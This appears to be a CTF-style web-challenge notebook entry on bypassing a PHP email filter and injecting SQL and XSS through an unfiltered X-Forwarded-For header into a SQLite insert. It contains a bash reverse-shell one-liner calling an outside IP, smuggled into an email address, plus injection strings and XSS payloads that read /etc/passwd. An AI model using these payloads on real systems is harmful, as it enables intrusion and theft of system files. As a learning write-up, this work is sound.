
**Day2**

**So, the email is filtered by a PHP builtin function/filter FILTER\_VALIDATE\_EMAIL**:

if\(empty\($email\) || \!filter\_var\($email, FILTER\_VALIDATE\_EMAIL\)\) \{
header\('Location: /?success=false\&msg=Please submit a valild email address\!'\);
exit;

**Looked this up, there is a little you can do here to bypass, but not a lot, if it goes straight into a commandline per se, you could do something like **\`bash \-i \>\& /dev/tcp/10\.10\.14\.26/4464 0\>\&1\`@example\.com

**But, this is not possible here, it is just data going into the database, but SQLI will probably be hard to do this way, not sure what else we can get from the database \(nothing looks like\), with sqlite/nosql its not likely to get code execution, etc\. 

Maybe we got it to execute some JS on the page, but lets not fight the email filter if we don't have to\!\!****There is an uncontrolled input being reflected to the page, IP address and email can be inserted directly into the DB the way its written, it does not look like a prepared statement etc**\.

**So, these are unfiltered, user controlled variables in the form of headers sent to the site:
**
X\_FORWARDED\_FOR
REMOTE\_ADDR
CLIENT\_IP

**The code gets the IP address directly from the headers:**

publicfunctiongetSubscriberIP\(\)\{
if\(array\_key\_exists\('HTTP\_X\_FORWARDED\_FOR', $\_SERVER\)\)\{
return$\_SERVER\["HTTP\_X\_FORWARDED\_FOR"\];
\}elseif\(array\_key\_exists\('REMOTE\_ADDR', $\_SERVER\)\) \{
return$\_SERVER\["REMOTE\_ADDR"\];
\}elseif\(array\_key\_exists\('HTTP\_CLIENT\_IP', $\_SERVER\)\) \{
return$\_SERVER\["HTTP\_CLIENT\_IP"\];
\}
return'';
\}

publicfunctionsubscribe\($email\)
\{
$ip\_address= $this\-\>getSubscriberIP\(\);


**This line of code inserts them:**
return$this\-\>db\-\>exec\("INSERTINTOsubscribers \(ip\_address, email\) VALUES\('$ip\_address', '$email'\)"\);

**So, potentially, this could bypass the email filter and at least do some XSS:**

1\.2\.3\.4','\<script\>alert\(1\);\</script\>'\)"\);#

**Could potentially run:**

return$this\-\>db\-\>exec\("INSERTINTOsubscribers \(ip\_address, email\) VALUES\('1\.2\.3\.4', '\<script\>alert\(1\);\</script\>'\)"\); #', '$email'\)"\);

This looks like it would insert 1\.2\.3\.4 for IP address, then the malicious XSS into the script\. 

**Let's try this\.**

**Set my burp request to have this in X\-Forwarded\-For:**1\.2\.3\.4','\<script\>alert\(1\);\</script\>'\)"\);#**

Hmm, its not reflected\.  Wrong about this one\!\!  Forgot, it does not show this output\.  No reflection that I can see so far\.

Looks like it just sends back a message in the next URL:
**GET /?success=true\&msg=Email%20subscribed%20successfully\! HTTP/1\.1**
**
**If it did work, potential payloads would be;**

\<script\>x=newXMLHttpRequest; x\.onload=function\(\)\{ document\.write\(this\.responseText\) \}; x\.open\("GET","file:///etc/passwd"\); x\.send\(\);\</script\>

\<img src="xasdasdasd"onerror="document\.write\('\<iframe src=file:///etc/passwd\>\</iframe\>'\)"/\>

\<script\>document\.write\('\<iframe src=file:///etc/passwd\>\</iframe\>'\);\</script\>

**Noticed something interesting in the logs when playing with this:
**
2022/05/15 16:57:54 \[error\] 9#9: \*32953 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::exec\(\): unrecognized token: \&quot;\&quot;\);#', 'ab@com\.com'\)\&quot; in /www/Database\.php on line 36" while reading response header from upstream, client: 172\.17\.0\.1, server: \_, request: "POST /subscribe HTTP/1\.1", upstream: "fastcgi://unix:/run/php\-fpm\.sock:", host: "localhost:1337", referrer: "[http://localhost:1337/"](#http://localhost:1337/")


